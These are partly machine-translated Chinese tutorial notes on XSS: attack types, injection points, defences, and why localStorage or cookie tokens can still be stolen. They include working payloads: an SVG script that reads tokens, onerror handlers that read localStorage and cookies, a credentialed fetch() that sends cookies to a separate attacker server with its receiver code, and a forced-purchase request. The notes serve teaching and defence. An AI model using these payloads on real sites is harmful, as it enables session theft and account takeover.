# XSS: 跨站脚本攻击
全称是 Cross-site scripting 

<br><br>

## XSS产生的原因: 
程序对输入和输出的控制不够严格, 导致 "精心构造" 的脚本输入后 在输到前端时 被浏览器当做有效的代码解析从而执行 产生危害

比如:  
我们可以在任意网站 在form表单中输入如下的代码 可以测试有没有 XSS 漏洞 如果有 则下面的代码则会执行

**执行过程是:**    
该方式是反射型 该代码会提交到服务器 然后由服务器返回 浏览器误解析执行恶意代码 才执行的
```s
'"><script>alert(22)</script>
```

上面的代码没有任何的危害性 但如果如上的代码是收集用户的
- cookie信息
- 密码信息
- 键盘操作信息

<br>

**原因:**  
在网站页面上没有对 **输入的信息** 进行 **严格控制** 导致了可以加载恶意代码从而对客户端用户造成威胁
 
<br><br>

## XSS侧重点:
它侧重于脚本 千方百计的注入并执行恶意脚本

<br><br>

### XSS攻击危害:
- 窃取 cookie
- 劫持流量
- 插入广告
- 置入木马
- 获取用户信息

- url参数注入 *
- 输入框注入 *

主要是利用 **url参数注入** & **输入框注入** 的方法 也就是说一切用户可以输入的地方都是XSS的用武之地, 所以一切用户的输入都是不安全的

<br>

- 一般在各类的社交平台 邮件系统 开源流行的web应用 造成的杀伤力十分强大

- 劫持用户的 cookie 信息 是最常见的跨站攻击形式  
通过在网页中写入并执行脚本文件 劫持用户的浏览器 将用户当前使用的 sessionId 信息发送至攻击者控制的网站或服务器中 

- 框架钓鱼 利用 js 脚本的基本功能之一 操作网页中的DOM树结构和内容 在网页中通过 js 脚本 生成虚假页面欺骗用户执行操作 而用户所有的输入内容都会被发送到攻击者的服务器上

- 木马
- 有局限性的键盘记录

<br>

### XSS攻击分类:

**反射型:**  
浏览器提交恶意代码到服务器 然后由服务器将恶意代码传回客户端, 前端浏览器将恶意代码当做有效代码解析并执行, **服务器返回代码中包含恶意代码**

**反射型恶意代码的过程:**  
恶意代码会由客户端到服务端 然后再由服务端返回客户端  
攻击过程必须让用户访问指定的url才能生效 并且访问过程产生的数据 不会对服务端和数据库产生影响

我们将 恶意的代码 注入到 url 上

<br>

**存储型:**  
浏览器提交恶意代码到服务器 然后服务器将恶意代码存到数据库, 存储型给用户带来的危害是最大的 因为它是最持久的

比如网页中的留言板的信息 就会永久的保存到数据里 会对访问网站响应页面的所有用户造成影响

<br>

**DOM型:**   
恶意代码没有提交到服务器 它仅在客户端运行, **服务器返回的代码是正常的**

**DOM型恶意代码的过程:**   
恶意代码会一直存储在客户端

**举例:**  
比如搜索引擎 当我们输入关键字的时候 会生成一个页面 页面中保存 含有关键字的各种连接 DOM型也是 我们在文本框内输入 恶意代码 会创建出来一个 指向攻击者的超链接

或者 当我们输入 恶意代码 后 会操作DOM树 生成一个假的网页 钓鱼

<br>

### 反射型 & DOM型 的注入方式:
通过 **url查询字符串参数的方式** 进行注入, 也就是说引诱用户点击我精心准备带有恶意代码的链接 
```s
http://xxx?kid="<script>恶意代码</script>"
```

<br>

**举例:**  
下面的案例是 前端页面有 input 我们会输出字符 后台开始进行匹配 显示对应的结构

下面 if else 判断中 将我们的输入分为两类
- 有信息
  - 输入的是 kobe
  - 其它信息

- 没信息

我们的逻辑判断主要是关注有没有输入信息 或者 关注的是特定的信息

但是没有对输入信息 做限制 比如不能输入什么信息 所以当我们写入 恶意的代码信息, 就会被浏览器解析

```php
if(isset($_GET["submit"])) {
  // 文本框为空情况
  if(empty($_GET["message"])) {
    $html.="<p>输入 kobe 试试</p>"

    // 文本框不为空
  } else {
    if($_GET["message"] == "kobe") {
      Shtml.="愿你和{$_GET["message"]}一样年轻"
    } else {

      // 恶意代码可能会在这里被浏览器解析
      Shtml.="who is {$_GET["message"]} i dont care"
    }
  }
}
```

<br>

### 存储型 的注入方式:
在输入框输入恶意代码 然后点击提交 就会提交到服务端 服务端会将恶意代码存储到数据库 以后用户每次访问 都会拉取到恶意代码并执行 所以给用户带来的危害是最持久的

<br><br>

## XSS脚本存在的地方
只要是变量的地方 就可以拼接 恶意代码

- 标签体
- 标签属性
- style样式值
- url & src & href
- onclick onerror onfocus等标签事件

<br>

### 标签体
脚本在 html 代码包含响应的 xss 漏洞代码信息
```html
<p>{{untrusted data}}</p>
```

<br>

### 标签属性
```html
<img src="image.png" alt = "{{untrusted data}}">
```

<br>

### URL中
```html
<a href="{{untrusted data}}"> link </a>
```

<br>

### Style中
```html
<img style="{{untrusted data}}">
```

<br><br>

## 预防 XSS 攻击
XSS的攻击过程是先注入再执行 所以我们要

- 防止注入
- 防止执行

<br>

所以要对用户的输入和输出做严格的把控, 所以

- <font coloe="#C2185B">对输入进行过滤</font>
- <font coloe="#C2185B">对输出进行转义</font>

- 服务器对输入脚本进行过滤或转码
- 前端对输入进行转码或者限制输入
- cookie使用httponly属性
- 添加验证码防止脚本冒充用户提交危险操作
- csp
  1. 限制加载其他域下的资源文件 这样即使黑客插入了一个js文件 这个文件也是无法被加载的
  2. 禁止向第三方域提交数据 这样用户数据也不会外泄
  3. 禁止执行内联脚本和未授权脚本
  4. 还得提供上报机制 这样可以帮助我们尽快发现有哪些xss攻击 以便修复

<br>

### 预防方案:

**校验:**  
对所有可输入的地方进行校验 比如我们收集的是邮箱 那么就看看是不是邮箱的格式

```html
用户名: <script>这就要校验</script>
```

<br>

**过滤:**  
主要是对 script 和 iframe 等特殊的标签 以及过滤掉 onclick onerror onfocus 等特殊的js事件属性

<br>

**编码转义:**  
对要渲染的内容进行编码转义 防止他们执行

```js
// 对 < > & 等字符进行了转义
function SaferHTML(templateData) {
  let s = '';
  for (let arg of templateData) {
    s += arg.replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;");
    }
  return s;
}
```

<br>

**限制:**  
限制输入的长度:  
因为恶意代码一般比较长 限制输入长度会增加攻击难度

<br>

**httpOnly:**  
cookie设置成 httponly   
因为我们一般会采集用户的cookie 设置该属性后会增加攻击难度

<br><br>

## XSS攻击原理:

### 利用原有网站的 url 地址获取用户数据信息

**用户正常访问网站的过程:**  
```
(正常的)            (正常的)
客户端用户          服务端网站
```

1. 用户向服务器请求登录页面
2. 用户输入登录信息
3. 服务器校验 校验成功 则登录成功

<br>

**XSS的访问过程:**  

```
(正常的)            (正常的)
客户端用户          服务端网站


          黑客用户
```

1. 黑客用户 请求服务器 请求登录页面

2. 黑客用户在登录页面利用xss漏洞 加载js恶意代码, 恶意代码的逻辑是将用户的用户名和密码发送到 黑客的服务器, 黑客会将这个 有问题的 url 通过某种手段 发送给用户

3. 用户在有恶意代码的登录页面 开始登录 将登录信息发送给黑客平台 自动页面跳转首页(为了迷惑用户)

4. 黑客平台拿到用户的登录信息后 将自己的http请求报文内容 替换为 用户的信息

<br>

### 利用自己网站的 url 地址获取用户数据信息
1. 黑客搭建自己的网站 发送公众号中
2. 用户访问黑客的网站, 黑客网站会采集用户的cookie信息(比如用户访问过的jd taobao的cookie)
3. 在黑客的平台获取用户的cookie信息 
4. 黑客利用用户的cookie的信息 假冒用户访问正规网站

<br><br>

# 为什么 localStorage 容易遭受 XSS 攻击
XSS是将一段恶意脚本添加到网页上, 通过浏览器加载而执行从而达到攻击并获得隐私信息的目的  

LocalStorage 和 SessionStorage 在这一点上都容易受到XSS攻击  攻击者可直接向本地存储对象添加恶意脚本并执行  因此不太建议把一些敏感的个人信息存储在Web Storage中

- 用户名密码
- 信用卡资料
- JsonWeb令牌
- API密钥
- SessionID

<br>

## 如何避免攻击？
1. 尽量不要用同一域名部署多个Web应用程序, 如果有这种场景请尽量使用子域名部署应用, 因为一旦多应用使用统一的域名, 这将会对所有的用户共享Web存储对象  

2. 一旦将数据存储在LocalStorage中, 开发人员在用户将其清除之前无法对其进行任何控制  如果希望在会话结束后自动删除数据, 请使用SessionStorage  

3. 从WebStorage读取出的数据都要验证、编码和转义  

4. 在保存进WebStorage前将数据加密  


<br><br>

## XSS案例1:

### 背景描述:
我和我的朋友ethicalbughunter正在一个私人程序上打猎 这个程序有一个导入功能, 我们可以上传 .csv 或 .docx 这样的文件, 当我们点击那个导入功能从桌面上选择文件时, 它显示 "所有支持的类型", 所以我们把桌面上的 "所有支持的类型 "改为 "所有文件", 然后上传了一个扩展名为 .svg 的文件, 该文件包含xml脚本中的XSS有效载荷

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0.0,50.50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
prompt('XSS-Attack');
prompt(document.domain);
prompt(document.cookie);
prompt(alert(localStorage.getItem("token")));
</script>
</svg>
```

起初, 文件被简单地上传, 但什么也没有发生, 我们无法找到文件被上传的路径  所以我们又重复了同样的步骤, 这次我们拦截了文件上传请求的响应, 在那里我们能够找到路径  我们访问了该路径并发现了一个存储的XSS  

在查看了认证流程后, 我们注意到, 每次登录都会生成一个认证令牌, 而且对每个账户都是唯一的 该令牌被存储在LocalStorage中, 该令牌也保护网站免受CSRF攻击  

**现在的问题是, 我们应该如何从Localstorage中窃取令牌？**  

因为如果我们设法做到这一点, 我们可能会制作不同的其他攻击  因此, 在我们的.svg文件中, 我们添加了一行从localstorage窃取令牌的提示(alert(localStorage.getItem("token")); 并上传了文件  当我们访问该路径时, 我们成功地从localstorage窃取了令牌  



在我看来, 它的发生有三个原因

在上传文件时, 没有检查扩展名
文件上传后, 没有进行Content-Type验证
在文件被发送到服务器后, 服务器没有对其进行验证

攻击者可以窃取任何用户的认证令牌, 并可以制作不同的攻击, 如csrf、会话攻击、账户接管等  

其影响取决于在localStorage中存储了什么样的信息  

网站应允许不可执行的扩展, 以及内容类型验证和服务器端检查, 以减轻这类问题  

---

如果你浏览互联网, 你会发现很多开发者在传播这样的信息：localStorage是不安全的, 你不应该用它来存储认证令牌  相反, 你应该使用http-only cookies来保存这些令牌  

在属于这篇文章的代码和视频中, 你可以详细看到如何在一个有漏洞的页面上发动XSS攻击  

请看一下这个简短的代码片段  
```js
const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
  <p>${someUserInput}</p>
`

outputElement.innerHTML = contentWithUserInput
```

这段代码有什么问题？

我们直接设置了某个outputElement的innerHTML(这可以是对我们页面上某个DOM元素的简单引用)  

如果someUserInput包含JavaScript代码, 这可能会导致问题  

```js
// highlight-next-line
const someUserInput = '<script>alert("Hacked!")</script>'

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
  <p>${someUserInput}</p>
`

outputElement.innerHTML = contentWithUserInput
```

说实话, 大多数浏览器都应该捕捉到这一点, 而且你确实不应该收到 "黑客 "警报  

但接下来的代码片段将导致问题  

```js
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="alert("Hacked")"'

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
  <p>${someUserInput}</p>
`

outputElement.innerHTML = contentWithUserInput
```

这有什么问题呢？

我们最终只是建立了一个字符串, 存储在contentWithUserInput中  而用上面的代码, 这个字符串会是这样的(所有值都被插入)  

```html
<img
  src="https://some-invalid-url.com/no-image!jpg"
  onerror="alert('Hacked')"
/>
<p>Some message...</p>
```

在注入的代码中, 我们故意尝试加载一个不存在的图像, 然后依次导致onerror代码执行  

onerror是<img>元素的有效HTML属性, 因此一切将正常运行  

如果用户输入(在本例中是从userPickedImageUrl接收的)没有转义, 那么XSS攻击就是这样发起的  

<br>

# 利用XSS攻击从本地存储中窃取数据

```js
// highlight-next-line
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="const token = localStorage.getItem("token")'

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
`

outputElement.innerHTML = contentWithUserInput
```

使用上面描述的XSS漏洞, 很容易窃取令牌和/或需要该令牌的任何其他数据  

在上面这个片段中, 我们在注入的代码中检索到了令牌, 然后我们可以把它发送到我们自己的服务器(即攻击者的服务器)或做任何我们想做的事情  

顺便说一下, 如果你认为我们在这里只偷了我们自己的令牌  这种用户生成的数据通常存储在数据库中, 然后可能被呈现给世界各地的各种用户(例如, 视频下面的评论)  

如果你存储了这种未经消毒的输入, 这种注入的XSS JavaScript代码可以在成千上万的机器上为成千上万的用户运行  所有这些令牌(也就是这些用户的数据)都将面临风险  

# 从localStorage切换到Cookies

你经常读到, 当涉及到存储认证令牌或类似数据时, cookies比localStorage更好--仅仅是因为cookies不容易受到XSS攻击  

这是不正确的!

如果我们使用cookie, 我们可以发起和上面一样的攻击  

下面是我们如何在cookie的帮助下获取一个令牌+存储它  

```js
async function authenticate(email, password) {
  const response = await fetch('https://my-backend.com/login', {
    method: 'POST',
    body: JSON.stringify({ email, password }),
  })

  const data = await response.json()

  document.cookie = 'token=' + data.token
}

```

这将令牌存储在一个名为token的cookie中  

当我们需要它时, 我们可以像这样检索它(例如, 用于发出的请求)  

```js
async function getUserInfo() {
  // highlight-start
  const token = document.cookie
    .split('; ')
    .find((c) => c.startsWith('token'))
    .split('=')[1]
  // highlight-end
  const response = await fetch('https://my-backend.com/user-data', {
    headers: {
      Authorization: 'Bearer ' + token,
    },
  })
  // handle response + response data thereafter
}
```

下面是我们如何用XSS攻击窃取令牌的代码  

```js
// highlight-start
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="const token = document.cookie.split("; ").find(c => c.startsWith("token")).split("=")[1]'
// highlight-end

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
`

outputElement.innerHTML = contentWithUserInput

```

这可能有点难读, 但归根结底, 我们正在运行我们经常用来获取令牌的相同代码  只是为了窃取它  

这是有道理的：如果我们可以用 "好的JavaScript代码 "获得存储在cookie中的令牌, 我们也可以用 "坏的代码 "来做  

# 使用http专用的Cookies

是的, 是的--我知道你们中的一些人现在在想什么  "马克斯, 你真傻, 你应该找一份新工作"  好吧, 也许(希望！)你不那么苛刻;-)

我使用的cookie是错误的cookie类型  

我们需要一个http-only cookie!

这种cookie不能通过客户端的JavaScript设置或读取  我们只能在服务器端设置http-only cookies  

例如, 使用Node和Express, 服务器端的代码可以是这样的  

```js
app.post('/authenticate-cookie', (req, res) => {
  res.cookie('token', 'abc', { httpOnly: true })
  res.json({ message: 'Token cookie set!' })
})
```

这就把令牌设置在一个http专用的cookie上, 然后发回给客户端  

浏览器将能够读取和使用该cookie, 但我们的浏览器端JavaScript代码不会  

因此, 我们甚至不再尝试在本地存储或使用该令牌  

客户端的认证代码看起来像这样  

```js
async function authenticate(email, password) {
  const response = await fetch('https://my-backend.com/authenticate-cookie', {
    method: 'POST',
    body: JSON.stringify({ email, password }),
  })
}
```

这就足够了, 因为token是cookie的一部分, 它被包含在响应中  

因此, 每当我们需要向受保护的资源发送一个请求时, 请求看起来就像这样  

```js
async function getUserInfo() {
  const response = await fetch('https://my-backend.com/user-data')
  // handle response + response data thereafter
}
```

为什么会这样呢？

因为http-only cookies会自动附加到发出的请求中--浏览器会处理这个问题  

至少, 如果请求的目标域与服务于前端的域相同, 它们就会自动附加  如果是不同的域--也就是说, 如果你有一个跨源请求(例如, 前端服务于my-page.com, 后端服务于my-backend.com), 你需要调整一下客户端的代码  

```js
async function getUserInfo() {
  const response = await fetch('https://my-backend.com/user-data', {
    // highlight-next-line
    credentials: 'include',
  })
  // handle response + response data thereafter
}
```

credentials是一个选项, 你可以在fetch()中设置, 将所有的cookies附加到发出的请求中  credentials的默认设置是同源的, 对于跨源请求, 你需要include作为一个值  

后台服务器需要做适当的准备--它需要在发回的响应中设置正确的 CORS 头信息  

例如, 在Node + Express上  

```js
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://my-page.com/')
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST')
  res.setHeader('Access-Control-Allow-Credentials', true)
  next()
})

```

这些标头授予my-page.com "权利", 使其能够向后端服务器发送带有凭证的GET和POST请求  

有了这样的设置, 一切都正常了, 我们正在使用纯http的cookies  

现在让我们来探讨一下为什么这比localStorage好得不是一星半点

# http-only Cookies and XSS
我们不能用客户端的JavaScript代码读取或写入http-only cookies  因此, 我们必须对XSS进行安全防护, 对吗？

那么, 这段代码呢？
```js
// highlight-start
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="fetch("https://localhost:8000/", { credentials: "include" })'
// highlight-end

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
`

outputElement.innerHTML = contentWithUserInput
```

这段代码将通过XSS注入的代码向localhost:8000发送请求  

而且由于凭证的存在  "include", 所有的cookie(是的, 也包括http专用的cookie)都会被附上  

我们所需要的是一个后端服务器, 它可以是这样的  

```js
const express = require('express')
const app = express()

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://localhost:3000')
  res.setHeader('Access-Control-Allow-Methods', 'GET')
  res.setHeader('Access-Control-Allow-Credentials', true)
  next()
})

app.get('/', (req, res) => {
  token = req.headers.cookie
    .split('; ')
    .find((c) => c.startsWith('token'))
    .split('=')[1]
  res.json({ message: 'Got ya!' })
})
app.listen(8000)
```

这个非常简单的服务器设置了正确的CORS头, 暴露了一个通往/的GET路由, 并从传入的cookie中读取令牌  

就这样了! 在这里, 你的http-only cookie是相当没有价值的  

当然你可以说它比localStorage令牌更难检索, 但最终它是相当简单的代码, 可以用来获取令牌  而且你可能不应该依赖潜在的攻击者不知道这种模式  

# SameSite如何？
你可能读了这篇文章后会想  

好吧, 我们得到了SameSite cookie属性  这应该有帮助  

只是为了澄清--这就是SameSite属性可以被添加的方式  

```
SameSite=Strict
```

SameSite有三种可能的值  

None(是默认值)  对任何网站的请求都会附加Cookies
Lax(是大多数浏览器的默认值)  允许在顶级导航中发送

Cookies, 并将与第三方网站发起的GET请求一起发送  

Strict Cookies只与针对同一网站的请求一起发送  
听起来像是一个解决方案, 对吗？

好吧, 首先要明白的是, Internet Explorer不支持SameSite属性! 而且即使在2020+, 你也可能无法忽略所有这些用户  

此外, Lax默认值只在一些浏览器中设置, 但例如它不是Safari的默认值--在那里, None是默认值  

你可以查一下整个浏览器的支持表, 了解更多信息  

但当然, 你可以阻止使用IE浏览器的用户--这是否真的是一个选项, 虽然取决于你的网站--2020年你仍然有大约6%的用户使用IE  

尽管如此, 你也不会百分之百地保存  是的, 将cookie发送到另一个域将不起作用  

但是, 在同一个网站上的攻击呢？

如果我访问了你的页面(通过XSS), 我仍然可以利用它代表你的用户在你的网站上做一些事情--例如, 我可以发起一些购买或做其他类似的坏事  

请记住, 窃取授权令牌可能不是攻击者的主要任务  毕竟, 这是关于与登录的用户做事情 - 为此, 我不一定需要你的令牌  我可以在你在页面上的时候为你做一些事情(通过注入的JavaScript)  

因此, 虽然你可以避免cookie/令牌被盗, 但你不能保护你的用户  

通过www.DeepL.com/Translator(免费版)翻译

# 问题只存在于本地主机上

但这里有一个重要的说明：这种情况只发生在使用localhost时, 因为localhost:3000和localhost:8000在技术上是同一个域  

如果你有不同的域--在现实中会是这种情况, 这种攻击模式是不可能的  所以这是一个胜利!

但是：这最终也救不了你  

是的, 令牌/cookie不能被发送到不同的域  

但说实话, 攻击者实际上并不真正需要它  

就像上面写的, 如果我通过XSS进入你的页面, 我并不关心实际的令牌  我可以简单地以你的名义开始购物(或任何已登录的用户可以在网站上做的事情)  

```js
// highlight-start
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="fetch("https://localhost:3000/buy-product?prodid=abc", { credentials: "include", method: "POST" })'
// highlight-end

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
`

outputElement.innerHTML = contentWithUserInput
```

由于用户已经登录并在cookie中存储了有效的token, 该cookie将被添加到请求中, 因为它是在同一个网站上  

这是一个问题--你无能为力  即使没有 "窃取 "授权令牌, 你也会受到攻击, 攻击者可以代表你的登录用户做一些事情  


# 实际的解决方案

因此, 如果所有的存储机制都是不安全的--那么你应该使用哪一种？

这完全取决于你!

我个人非常喜欢localStorage, 因为它很容易使用  

最关键的是, 你要防止XSS - 那么你就不会有问题, 无论你使用哪种方法  

你的页面不能受到XSS的攻击  

是的, 这是一个微不足道, 甚至有点愚蠢的说法, 但这是事实  

如果你的页面容易受到XSS的攻击, 你就会有问题  而只用http的cookies是无法拯救你的  

# 了解跨站点脚本攻击

跨站脚本(XSS)攻击是指在其他用户的机器上运行JavaScript代码  

这是通过将一些恶意的JavaScript代码 "注入 "到将被呈现给网站访问者的内容中来实现的  然后每个访问者都会执行这些恶意代码, 这就是坏事的开始  

但是, 首先要做的是：这种恶意代码是如何被注入的？

# 注入恶意代码

在上面视频和代码片段中的例子中, 你可以看到用户可以输入消息和图像url, 然后都输出到页面上:

```html
<section id="user-input">
  <form>
    <div class="form-control">
      <label for="user-message">Your Message</label>
      <textarea id="user-message" name="user-message"></textarea>
    </div>
    <div class="form-control">
      <label for="message-image">Message Image</label>
      <input type="text" id="message-image" name="message-image" />
    </div>
    <button type="submit">Send Message</button>
  </form>
</section>
<section id="user-messages">
  <ul></ul>
</section>
```

```js
// ...
function renderMessages() {
  let messageItems = ''
  for (const message of userMessages) {
    messageItems = `
      ${messageItems}
      <li class="message-item">
        <div class="message-image">
          <img src="${message.image}" alt="${message.text}">
        </div>
        <p>${message.text}</p>
      </li>
    `
  }

  userMessagesList.innerHTML = messageItems
}
// ...
```

(也可以查看完整的代码示例)

用户添加的消息在使用innerHTML的最终输出中  

innerHTML接受一个字符串并将其解释为HTML, 然后将其呈现到屏幕上  

因此, 上面的代码示例导致一个<li>, 其中呈现了一个图像和一些文本  

但是, 如果用户现在使用表单输入以下消息呢?

```html
<script>
 alert('Hacked!');
 // ... do more bad things
 // e.g. send a fetch() request to steal data
</script>
```

这将通过innerHTML作为信息的一部分输出, 因此, <script>元素确实会被浏览器渲染  

但是如果使用上面的示例, 您将注意到没有显示警告  因此, 看起来注入的脚本代码并没有实际执行  

事实确实如此  

现代浏览器保护您免受这种非常基本的XSS攻击  <script>元素"注入"通过innerHTML不被浏览器执行!

所以这行不通  

但是这里有一种有效的方法:滥用<img> src被设置为某些用户输入的事实  

请记住, 我们在JavaScript代码中是这样设置图像的:

```js
// ...
messageItems = `
      ${messageItems}
      <li class="message-item">
        <div class="message-image">
          <img src="${message.image}" alt="${message.text}">
        </div>
        <p>${message.text}</p>
      </li>
    `
// ...

```

在上面的代码片段中, 使用模板字面量语法构建了一个简单的字符串  

这个字符串稍后会传递给innerHTML  

如果我们可以操纵信息  图像, 这样它实际上完全改变了要渲染的元素?不仅仅是它的src  

以下是用户可以在表单中输入的内容(为图像url)来实现这一点:

这可能看起来很奇怪, 但这最终会导致通过innerHTML设置这个字符串:

```html
<li class="message-item">
  <div class="message-image">
    <img
      src="invalid-page.com/no-image!jpg"
      onerror="alert('Hacked!')"
      alt="Test"
    />
  </div>
  <p>Test</p>
</li>
```

你看到问题了吗?

整个<img>被操纵了!

攻击者将图像src设置为无效URL, 将无法加载!通过设置onerror (<img>!的有效属性), 我们可以定义在图像加载失败时执行的JavaScript代码  

所以我们强迫图像加载失败, 我们通过设置错误的恶意代码提供"补救"  非常聪明的……

在本例中, 我们将看到"Hacked!"警报, 但当然, 我们可以用注入的JavaScript代码做更糟糕的事情  

# 黑客攻击自己vs他人

到目前为止, 通过上面的例子, 我们只是在黑自己  没有涉及服务器或数据库, 所有的代码只在本地执行  

但当然, 这只是情况, 因为这是一个基本的例子, 重点在前端  

在现实中, 用户生成的内容(即消息+图片网址)将被发送到服务器并存储在一些数据库中  

其他用户会获取这些内容, 并在他们的浏览器中呈现在页面上, 然后......我们黑了他们！"  

注入的JavaScript代码可以做任何事情, 例如窃取认证令牌(也可参见我关于该主题的专门文章和视频)  

这是一个巨大的问题!

正如你所看到的  添加这种恶意代码并不太困难  

# 你如何保护你的应用程序？
这里有一个简单而重要的规则  在存储和提供用户生成的内容之前, 一定要对其进行消毒处理!

"消毒内容 "意味着你要删除所有可能存在于用户生成的内容中的恶意部分  

有一些库可以帮助你做到这一点--例如, 这个用于JavaScript/Node的库  其他编程语言也有类似的库--你总是想检查包的描述, 以了解它是否对你的项目有帮助  

净化不只是对XSS有帮助, 对SQL和NoSQL注入也有帮助  

你应该只在你的数据库中存储经过清洗(=sanitized)的内容  通过这样做, 你将确保你只为你的用户提供安全的内容  

此外, 你可以研究在你的客户端JavaScript代码中对内容进行转义  

这意味着你在前台也有一个消毒步骤--除了后台的步骤  

现代框架, 如Angular、React.js或Vue, 都内置了这个功能  

客户端转义只是一个额外的好处--你真的应该只在数据库中存储安全的内容!

# 隐藏的危险

但不幸的是, 除了未经审核的用户生成的内容外, 还有另一个XSS攻击的来源  

包含在你的前端项目代码中的第三方JavaScript库!

在现代客户端应用程序中, 我们通常使用大量的第三方库  从Angular这样的框架到lodash这样的实用库  

而包含在这些库中的代码也作为你的客户端代码的一部分运行  

如果这些库中的一个被破坏了怎么办？如果它包含恶意代码呢？

你不会注意到--而你将陷入深深的困境  

一个包含在你的代码中的被破坏的库是一个巨大的问题  

# 防范 图书馆 被破坏

你可以减少包含危险的第三方库的危险  

首先, 你当然可能想坚持使用更大、更流行和维护良好的库  像谷歌这样的公司(例如正在维护Angular)可能对侵入你的应用程序/用户没有兴趣  

但即使是这样受欢迎的库, 理论上也可能包含安全漏洞  

Angular可能是一个不好的例子, 因为他们有一个完整的团队专门从事Angular的工作, 但如果你想想其他流行的库, 他们往往只有一个小团队(有时只有一个人)从事该库的工作  而这些团队甚至可能不是全职在做  

可能发生的情况是, 一个恶意的拉动请求被潜入代码库, 突然间一个受信任的库就被破坏了  

当然, 你可以检查你所使用的库的源代码  这可能很麻烦, 但这是唯一能100%确定该库没有问题的方法  当然, 你需要在每次更新和新版本的库中重复这样做......

像npm audit这样的命令也能帮助你  至少它们会浮现出已知的漏洞  当然, 未知的漏洞仍然是一个危险  

现实地说, 除非你自己写所有的代码, 否则你可能无法实现对XSS的100%保护  

但通过坚持上述做法, 你可以将风险降到最低  而且你绝对应该这样做, 因为XSS攻击真的很糟糕!

通过www.DeepL.com/Translator(免费版)翻译


---

在过去的几个月时间里, 我遇到过一些JSON Web令牌(JWT)的不安全实现, 而这些不安全实现最终导致了目标Web应用程序遭到黑客入侵  在某些场景中, 攻击者可以利用错误配置并通过XSS漏洞来窃取管理员令牌, 或伪造用户注册过程中的用户协议并利用管理员权限创建标准用户账号  

JWT与传统的Cookie有所不同, 它们虽然很相似, 但很多人会错误地认为攻击者无法使用这种方式来对JWT进行攻击  

在这篇文章中, 我们将对JWT进行简单介绍, 以及JWT和传统Cookie之间的区别, 并演示如何窃取JWT, 最后还会给出相应的安全解决方案  

JSON Web令牌是什么？
简而言之, JWT, 即JSON Web令牌, 它可以帮助用户快速简单地完成系统的身份验证(一般使用开源库实现验证机制)  JWT由以下三个部分组成, 每个部分由"."分隔：

```
header.payload.signature

```

header表明所使用的哈希算法, payload中包含与用户相关的信息(例如角色和访问权限等), signature用于确保消息完整性  

在大多数配置中, 当用户提供了有效凭证时, 这个令牌会在HTTP头中进行设置, 并用于后续身份授权, 这一点跟标准的会话Cookie类似  

最近这几年, 社区曝光过很多JWT的相关漏洞, 而且也有很多技术文章对这些漏洞进行过讨论了, 比如说算法攻击以及通过Payload篡改来实现提权等等  那么在这篇文章中, 我并不打算过多去讨论JWT架构以及之前的相关漏洞  


如何恢复传统Cookie和JWT


Cookie的作用就在于, 它可以向一个有状态协议(例如HTTP)提供相关的状态信息  我们举一个简单的例子, 会话Cookie就可以用来追踪一款Web应用程序上经过身份验证的用户会话  为了实现这一点, 会话的记录必须同时存在于服务器端和客户端上  

从JWT的角度来看, 令牌可以是无状态的  也就是说, 服务器端是不会存储会话记录的  相反, 每一个发送至服务器端的请求都会包含一个用户令牌, 服务器会根据令牌信息来验证用户的身份权限  

Cookie和JWT都遵循相似的事件流来请求和接收会话令牌, 当用户提供有效的身份凭证之后, 服务器会返回一个包含了会话令牌的响应  不同之处就在于, Cookie是使用SET-COOKIE命令设置的, 但JWT一般是在AUTHORIZATION头中设置的  



它们存储在哪里?




我们用默认配置来进行总结：

localStorage / sessionStorage
默认情况下, Web了浏览器容器几乎是相同的  关闭浏览器之后, localStorage将保持不变, sessionStorage仅持续到浏览器关闭之前  因此, 只能在客户端读取到, 而不能在服务器端读取到, 而且只能通过JavaScript读取到  

Cookie

我们的目的是要让发送的信息在服务器端读取和验证  如果配置了正确的保护机制, 恶意JavaScript将很难读取到这些数据  


传统Cookie保护


一般来说, 攻击者会通过XSS漏洞来攻击身份认证Cookie, 然后尝试劫持目标的管理员会话, 并最终通过攻击包含漏洞的Web服务器打开进入目标网络系统的"大门", 

我们可以为存储在Cookie容器中的数据设置Header参数, 除了解决底层XSS问题之外, 有HttpOnly、secure、path和domain等标志可以提供不同级别的安全保护  然后再将JWT存储在localStorage中......这就像将密码存储在文本文件中一样  


如何通过XSS漏洞窃取localStorage中的JWT


在近期的一次研究中, 我发现了一个存储型XSS漏洞, 而目标应用程序正好使用了JWT来作为身份验证机制的实现  Payload设置成功后, 任何访问了该Web页面的用户其JWT都会被发送给攻击者  

一开始, 我无法通过XSS来获取JWT  主要是因为每个JWT都存储有唯一的标识符/键, 所以在不知道这些信息的情况下是无法调用它的  比如说, 在JavaScript警告框中显示标准Cookie(无保护机制)的典型方法如下：

```
<script>alert(document.cookie)</script>

```

因为localStorage中的数据会存储在一个数组中, 它无法通过类似方法来调用或读取：

```
<script>alert(localStorage)</script>
```

但是, 我们可以通过使用getItem()函数来获取存储在localStorage或sessionStorage中的每一个对象：

```
<script>alert(localStorage.getItem(‘key’))</script>


<script>alert(localStorage.getItem(‘ServiceProvider.kdciaasdkfaeanfaegfpe23.username@company.com.accessToken’))</script>
```


如上图所示, 我们还需要弄清楚"key"这个唯一标识符是什么：

